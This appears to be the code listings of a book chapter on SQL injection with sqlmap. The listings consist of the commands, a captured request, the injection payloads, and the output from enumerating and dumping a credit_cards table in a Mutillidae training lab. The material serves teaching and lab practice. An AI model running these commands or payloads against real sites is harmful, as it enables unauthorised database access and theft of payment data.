@@ -1,0 +1,307 @@
+//code 11.1
+root@kali:~# sqlmap -u https://sanjibsinha.fun -a
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+[*] starting @ 06:24:04 /2019-08-20/
+[06:24:05] [INFO] testing connection to the target URL
+[06:24:08] [INFO] checking if the target is protected by some kind of WAF/IPS
+[06:24:09] [INFO] testing if the target URL content is stable
+[06:24:40] [WARNING] potential CAPTCHA protection mechanism detected
+[06:24:40] [WARNING] it appears that you have been blocked by the target server
+[06:24:40] [WARNING] target URL content is not stable (i.e. content differs). sqlmap will base the page comparison on a sequence matcher. If no dynamic nor injectable parameters are detected, or in case of junk results, refer to user's manual paragraph 'Page comparison'
+how do you want to proceed? [(C)ontinue/(s)tring/(r)egex/(q)uit] c
+[06:24:53] [INFO] searching for dynamic content
+[06:25:00] [CRITICAL] target URL content appears to be heavily dynamic. sqlmap is going to retry the request(s)
+[06:25:22] [WARNING] target URL content appears to be too dynamic. Switching to '--text-only' 
+[06:25:22] [CRITICAL] no parameter(s) found for testing in the provided data (e.g. GET parameter 'id' in 'www.site.com/index.php?id=1')
+[*] ending @ 06:25:22 /2019-08-20/
+
+-------------------------
+
+//code 11.2
+GET /mutillidae/index.php?page=user-info.php&username=sanjib&password=123456&user-info-php-submit-button=View+Account+Details HTTP/1.1
+Host: 192.168.2.3
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://192.168.2.3/mutillidae/index.php?page=user-info.php
+Cookie: showhints=1; PHPSESSID=h5ssn4mn749e9apf1j5hflmbm3; acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+--------------------------
+
+
+//code 11.3
+root@kali:/tmp# sqlmap -r test.request --banner
+
+
+---------------------------
+
+//code 11.4
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+[*] starting @ 08:30:37 /2019-08-20/
+[08:30:37] [INFO] parsing HTTP request from 'test.request'
+[08:30:38] [INFO] testing connection to the target URL
+[08:30:40] [INFO] heuristics detected web page charset 'windows-1252'
+[08:30:40] [INFO] testing if the target URL content is stable
+[08:30:40] [INFO] target URL content is stable
+[08:30:40] [INFO] testing if GET parameter 'page' is dynamic
+[08:30:41] [INFO] GET parameter 'page' appears to be dynamic
+...
+[08:31:04] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
+….
+[08:33:51] [INFO] testing if GET parameter 'username' is dynamic
+[08:33:53] [WARNING] GET parameter 'username' does not appear to be dynamic
+…..
+[08:43:14] [INFO] target URL appears to have 7 columns in query
+[08:43:21] [INFO] GET parameter 'username' is 'MySQL UNION query (NULL) - 1 to 20 columns' injectable
+GET parameter 'username' is vulnerable. Do you want to keep testing the others (if any)? [y/N] n
+sqlmap identified the following injection point(s) with a total of 218 HTTP(s) requests:
+---
+    Payload: page=user-info.php&username=-3423' OR 4975=4975#&password=123456&user-info-php-submit-button=View Account Details
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: page=user-info.php&username=sanjib' AND (SELECT 8222 FROM(SELECT COUNT(*),CONCAT(0x7162767071,(SELECT (ELT(8222=8222,1))),0x7162717a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- dNfA&password=123456&user-info-php-submit-button=View Account Details
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: page=user-info.php&username=sanjib' AND SLEEP(5)-- sJJx&password=123456&user-info-php-submit-button=View Account Details
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 7 columns
+    Payload: page=user-info.php&username=sanjib' UNION ALL SELECT NULL,CONCAT(0x7162767071,0x4d72546474614551564b707a554b4b6d6d4542524f6547444953444f52656a4b5a724c6a514c5868,0x7162717a71),NULL,NULL,NULL,NULL,NULL#&password=123456&user-info-php-submit-button=View Account Details
+---
+[08:43:23] [INFO] the back-end DBMS is MySQL
+[08:43:23] [INFO] fetching banner
+web server operating system: Linux Ubuntu 10.04 (Lucid Lynx)
+web application technology: PHP 5.3.2, Apache 2.2.14
+back-end DBMS operating system: Linux Ubuntu
+back-end DBMS: MySQL >= 5.0
+banner: '5.1.41-3ubuntu12.6-log'
+[08:43:24] [INFO] fetched data logged to text files under '/root/.sqlmap/output/192.168.2.3'
+
+[*] ending @ 08:43:24 /2019-08-20/
+
+
+-------------------------------
+
+
+//code 11.5
+root@kali:/tmp# sqlmap -r test.request -p username --dbms=MySQL --banner
+
+-------------------------
+
+
+//code 11.6
+Parameter: username (GET)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)
+    Payload: page=user-info.php&username=-3423' OR 4975=4975#&password=123456&user-info-php-submit-button=View Account Details
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: page=user-info.php&username=sanjib' AND (SELECT 8222 FROM(SELECT COUNT(*),CONCAT(0x7162767071,(SELECT (ELT(8222=8222,1))),0x7162717a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- dNfA&password=123456&user-info-php-submit-button=View Account Details
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: page=user-info.php&username=sanjib' AND SLEEP(5)-- sJJx&password=123456&user-info-php-submit-button=View Account Details
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 7 columns
+    Payload: page=user-info.php&username=sanjib' UNION ALL SELECT NULL,CONCAT(0x7162767071,0x4d72546474614551564b707a554b4b6d6d4542524f6547444953444f52656a4b5a724c6a514c5868,0x7162717a71),NULL,NULL,NULL,NULL,NULL#&password=123456&user-info-php-submit-button=View Account Details
+---
+[08:47:22] [INFO] testing MySQL
+[08:47:23] [WARNING] reflective value(s) found and filtering out
+[08:47:23] [INFO] confirming MySQL
+[08:47:29] [INFO] the back-end DBMS is MySQL
+[08:47:29] [INFO] fetching banner
+web server operating system: Linux Ubuntu 10.04 (Lucid Lynx)
+web application technology: PHP 5.3.2, Apache 2.2.14
+back-end DBMS operating system: Linux Ubuntu
+back-end DBMS: MySQL >= 5.0.0
+banner: '5.1.41-3ubuntu12.6-log'
+[08:47:29] [INFO] fetched data logged to text files under '/root/.sqlmap/output/192.168.2.3'
+
+[*] ending @ 08:47:29 /2019-08-20/
+
+
+------------------------
+
+
+//code 11.7
+root@kali:/tmp# sqlmap -r test.request -p username --dbms=MySQL --dbs
+
+
+-----------------------
+
+//code 11.8
+Type: UNION query
+    Title: MySQL UNION query (NULL) - 7 columns
+    Payload: page=user-info.php&username=sanjib' UNION ALL SELECT NULL,CONCAT(0x7162767071,0x4d72546474614551564b707a554b4b6d6d4542524f6547444953444f52656a4b5a724c6a514c5868,0x7162717a71),NULL,NULL,NULL,NULL,NULL#&password=123456&user-info-php-submit-button=View Account Details
+---
+[08:49:35] [INFO] testing MySQL
+[08:49:35] [INFO] confirming MySQL
+[08:49:37] [WARNING] reflective value(s) found and filtering out
+[08:49:37] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu 10.04 (Lucid Lynx)
+web application technology: PHP 5.3.2, Apache 2.2.14
+back-end DBMS: MySQL >= 5.0.0
+[08:49:37] [INFO] fetching database names
+available databases [34]:
+[*] .svn
+[*] bricks
+[*] bwapp
+[*] citizens
+[*] cryptomg
+[*] dvwa
+[*] gallery2
+[*] getboo
+[*] ghost
+[*] gtd-php
+[*] hex
+[*] information_schema
+[*] isp
+[*] joomla
+[*] mutillidae
+[*] mysql
+[*] nowasp
+[*] orangehrm
+[*] personalblog
+[*] peruggia
+[*] phpbb
+[*] phpmyadmin
+[*] proxy
+[*] rentnet
+[*] sqlol
+[*] tikiwiki
+[*] vicnum
+[*] wackopicko
+[*] wavsepdb
+[*] webcal
+[*] webgoat_coins
+[*] wordpress
+[*] wraithlogin
+[*] yazd
+
+[08:49:38] [INFO] fetched data logged to text files under '/root/.sqlmap/output/192.168.2.3'
+
+[*] ending @ 08:49:38 /2019-08-20/
+
+-------------------------
+
+//code 11.9
+root@kali:/tmp# sqlmap -r test.request -p username --dbms=MySQL -D nowasp --tables
+
+
+----------------------------
+
+//code 11.10
+…
+[08:51:31] [INFO] testing MySQL
+[08:51:31] [INFO] confirming MySQL
+[08:51:33] [WARNING] reflective value(s) found and filtering out
+[08:51:33] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu 10.04 (Lucid Lynx)
+web application technology: PHP 5.3.2, Apache 2.2.14
+back-end DBMS: MySQL >= 5.0.0
+[08:51:33] [INFO] fetching tables for database: 'nowasp'
+Database: nowasp
+[12 tables]
++----------------------------+
+| accounts                   |
+| balloon_tips               |
+| blogs_table                |
+| captured_data              |
+| credit_cards               |
+| help_texts                 |
+| hitlog                     |
+| level_1_help_include_files |
+| page_help                  |
+| page_hints                 |
+| pen_test_tools             |
+| youtubevideos              |
++----------------------------+
+
+[08:51:34] [INFO] fetched data logged to text files under '/root/.sqlmap/output/192.168.2.3'
+[*] ending @ 08:51:34 /2019-08-20/
+
+------------------------
+
+//code 11.11
+root@kali:/tmp# sqlmap -r test.request -p username --dbms=MySQL -D nowasp -T credit_cards --columns
+
+
+----------------------------
+
+//code 11.12
+[08:54:05] [INFO] testing MySQL
+[08:54:05] [INFO] confirming MySQL
+[08:54:06] [WARNING] reflective value(s) found and filtering out
+[08:54:06] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu 10.04 (Lucid Lynx)
+web application technology: PHP 5.3.2, Apache 2.2.14
+back-end DBMS: MySQL >= 5.0.0
+[08:54:06] [INFO] fetching columns for table 'credit_cards' in database 'nowasp'
+Database: nowasp
+Table: credit_cards
+[4 columns]
++------------+---------+
+| Column     | Type    |
++------------+---------+
+| ccid       | int(11) |
+| ccnumber   | text    |
+| ccv        | text    |
+| expiration | date    |
++------------+---------+
+[08:54:07] [INFO] fetched data logged to text files under '/root/.sqlmap/output/192.168.2.3'
+[*] ending @ 08:54:07 /2019-08-20/
+
+------------------------
+
+
+//code 11.13
+root@kali:/tmp# sqlmap -r test.request -p username --dbms=MySQL -D nowasp -T credit_cards --dump
+
+----------------------
+
+//code 11.14
+[08:56:26] [INFO] testing MySQL
+[08:56:26] [INFO] confirming MySQL
+[08:56:28] [WARNING] reflective value(s) found and filtering out
+[08:56:28] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu 10.04 (Lucid Lynx)
+web application technology: PHP 5.3.2, Apache 2.2.14
+back-end DBMS: MySQL >= 5.0.0
+[08:56:28] [INFO] fetching columns for table 'credit_cards' in database 'nowasp'
+[08:56:28] [INFO] fetching entries for table 'credit_cards' in database 'nowasp'
+Database: nowasp
+Table: credit_cards
+[5 entries]
++------+-----+------------------+------------+
+| ccid | ccv | ccnumber         | expiration |
++------+-----+------------------+------------+
+| 1    | 745 | 4444111122223333 | 2012-03-01 |
+| 2    | 722 | 7746536337776330 | 2015-04-01 |
+| 3    | 461 | 8242325748474749 | 2016-03-01 |
+| 4    | 230 | 7725653200487633 | 2017-06-01 |
+| 5    | 627 | 1234567812345678 | 2018-11-01 |
++------+-----+------------------+------------+
+
+[08:56:29] [INFO] table 'nowasp.credit_cards' dumped to CSV file '/root/.sqlmap/output/192.168.2.3/dump/nowasp/credit_cards.csv'
+[08:56:29] [INFO] fetched data logged to text files under '/root/.sqlmap/output/192.168.2.3'
+[*] ending @ 08:56:29 /2019-08-20/
+
+
+-------------------------
+
+//code 11.15
+<meta name="generator" content="WordPress 3.9.2" />
+
+
+-------------------------
+
+//code 11.16
+root@kali:~# dirbuster
+
+--------------------------
+
+
